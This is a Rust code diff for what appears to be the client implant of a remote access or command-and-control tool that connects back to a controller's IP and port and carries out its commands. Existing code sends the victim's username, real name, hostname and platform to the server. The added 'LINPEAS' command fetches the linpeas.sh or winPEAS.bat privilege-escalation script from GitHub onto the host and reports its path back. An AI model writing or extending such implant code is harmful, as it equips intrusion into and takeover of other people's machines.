@@ -9,6 +9,7 @@ use whoami::fallible;
 
 use crate::{error, shell, success};
 use crate::files::{prep_download, receive_file, string_to_path, upload};
+use crate::utils::download_latest_release;
 
 pub fn start_client(ip: String, port: String) {
     loop {
@@ -119,6 +120,21 @@ fn handle_server_response(stream: &mut TcpStream, response: String) -> Result<()
                     whoami::platform(), whoami::distro(), whoami::arch(), whoami::username(),  whoami::realname(), whoami::devicename(), fallible::hostname().unwrap_or(String::from("ERROR"))
                 );
                 stream.write_all(info.as_bytes()).unwrap();
+            }
+            "LINPEAS" => {
+                #[cfg(unix)]
+                let os_pattern = "linpeas.sh";
+                #[cfg(windows)]
+                let os_pattern = "winPEAS.bat";
+
+                match download_latest_release("peass-ng", "PEASS-ng", os_pattern) {
+                    Ok(path) => {
+                        stream
+                            .write_all(format!("OK\n{}", path).as_bytes())
+                            .unwrap();
+                    }
+                    Err(e) => stream.write_all(e.to_string().as_bytes()).unwrap(),
+                }
             }
             "QUIT" => {
                 thread::sleep(Duration::from_millis(500));
